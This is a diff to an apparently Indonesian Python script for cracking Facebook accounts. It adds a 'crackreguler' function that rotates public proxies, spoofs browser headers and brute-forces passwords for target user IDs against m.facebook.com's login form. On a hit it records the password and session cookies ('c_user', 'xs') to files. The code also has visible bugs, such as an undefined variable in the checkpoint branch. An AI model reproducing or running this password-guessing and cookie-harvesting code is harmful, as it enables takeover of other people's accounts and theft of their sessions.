@@ -632,7 +632,7 @@ def menu(my_name, my_id):
     if HaHi in [""]:
         console.print(f" {H2}• {P2}[bold red]Masukan Yang Bener Tolol!!! ")
     elif HaHi in ["1", "01"]:
-        idt = input('\n[ ID Target : ')
+        idf = input('\n[ ID Target : ')
         dump(idf,"",{"cookie":cok},token)
         setting()
     elif HaHi in ["2", "02"]:
@@ -1433,7 +1433,7 @@ def metslow():
                 elif "validatev2" in method:
                     pool.submit(ValidateV2, idf, pwv)
                 elif "reguler" in method:
-                    pool.submit(reghehe, idf, pwv)
+                    pool.submit(crackreguler, idf, pwv,'m.facebook.com')
                 elif "mbasic" in method:
                     pool.submit(crackbasi, idf, pwv)
                 else:
@@ -1500,7 +1500,7 @@ def metcepat():
                 elif "validatev2" in method:
                     pool.submit(ValidateV2, idf, pwv)
                 elif "reguler" in method:
-                    pool.submit(reghehe, idf, pwv)
+                    pool.submit(crackreguler, idf, pwv,'m.facebook.com')
                 elif "mbasic" in method:
                     pool.submit(crackbasi, idf, pwv)
                 else:
@@ -1518,6 +1518,93 @@ def metcepat():
     )
     Console().print(f"[bold cyan]   ╰[bold green] OK ─> {ok}	[bold yellow]CP ─> {cp}")
     print("")
+
+
+
+
+#----------[ METODE-REGULER ]----------#	
+def crackreguler(idf,pwv,url):
+	global loop,ok,cp
+	ses = requests.Session()
+	rr = random.randint
+	rc = random.choice
+	emot = rc(["😝","😜","🤪"])
+	prog.update(des,description=f"\r {emot} ( REGULER ) (%s OK : {ok} %s) (%s CP : {cp} %s) (%s {loop} %s) "%(hijo,puti,kun,puti,hijo,puti))
+	prog.advance(des)
+	for pw in pwv:
+		try:
+			proxs = requests.get('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt').text
+			open('socks4.txt','w').write(proxs)
+			nip = rc(proxs)
+			proxs = {'http': 'socks5://'+nip}
+			ua = opera()
+			ua2 = random.choice(ugen2)
+			ses.headers.update(
+			{
+			"Host":url,
+			"upgrade-insecure-requests":"1",
+			"user-agent":ua,
+			"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+			"dnt":f"{str(rr(1,9))}",
+			"x-requested-with":"mark.via.gp",
+			"sec-fetch-site":"same-origin",
+			"sec-fetch-mode":"cors",
+			"sec-fetch-user":"empty",
+			"sec-fetch-dest":"document",
+			"referer":f"https://{url}/",
+			"accept-encoding":"gzip, deflate br",
+			"accept-language":"en-US;q=0.8,en;q=0.7"
+			}
+		)
+			link = ses.get('https://m.facebook.com/login/?email='+idf).text
+			date = ({'lsd':re.search('name="lsd" value="(.*?)"', str(link)).group(1),'jazoest':re.search('name="jazoest" value="(.*?)"', str(link)).group(1),'m_ts':re.search('name="m_ts" value="(.*?)"', str(link)).group(1),
+'li':re.search('name="li" value="(.*?)"', str(link)).group(1),'email':idf,'pass':pw})
+			ses.headers.update(
+			{
+			'Host': url,
+			'cache-control': 'max-age=0',
+			'upgrade-insecure-requests': '1',
+			'origin': 'https://'+url,
+			'content-type': 'application/x-www-form-urlencoded',
+			'user-agent': ua,
+			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+			'sec-fetch-site': 'same-origin',
+			'sec-fetch-mode': 'cors',
+			'sec-fetch-user': 'empty',
+			'sec-fetch-dest': 'document',
+			'referer': f'https://{url}/login/?email='+idf,
+			'accept-encoding':'gzip, deflate br',
+			'accept-language': 'en-US;q=0.8,en;q=0.7'
+			}
+		)
+			po = ses.post(f"https://{url}/login/login/device-based/regular/login/?shbl=1&refsrc=deprecated", data=date,allow_redirects=False,proxies=proxs)
+			if "c_user" in ses.cookies.get_dict().keys():
+				ok+=1
+				coki = ses.cookies.get_dict()
+				kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
+				print(f"\n⌲ User ID: {hijo}{idf}{puti}")
+				print(f"⌲ Password: {hijo}{pw}{puti}")
+				print(f"⌲ Tahun: {mer}{tahun(idf)}{puti}")
+				print(f"⌲ Cookie: {hijo}{kuki}{puti}")
+				print(f'{hijo}{ua}')
+				open('OK/' + okc, 'a').write(f"{idf}|{pw}|{kuki}|{ua}\n")
+				break			
+			elif "checkpoint" in po.cookies.get_dict().keys():
+				print(f"\n⌲ User ID: {kun}{idf}{puti}")
+				print(f"⌲ Password: {kun}{pw}{puti}")
+				print(f"⌲ Tahun: {mer}{tahun(idf)}{puti}")
+				print(f'{kun}{ua}')
+				open('CP/' + cpc, 'a').write(f"{idf}|{pw}|{kuki}|{ua}\n")
+				akune.append(idf+'|'+pw)
+				ceker(idf,pw)
+				cp+=1
+				break	
+				
+			else:
+				continue
+		except requests.exceptions.ConnectionError:
+			time.sleep(31)
+	loop+=1
 
 
 
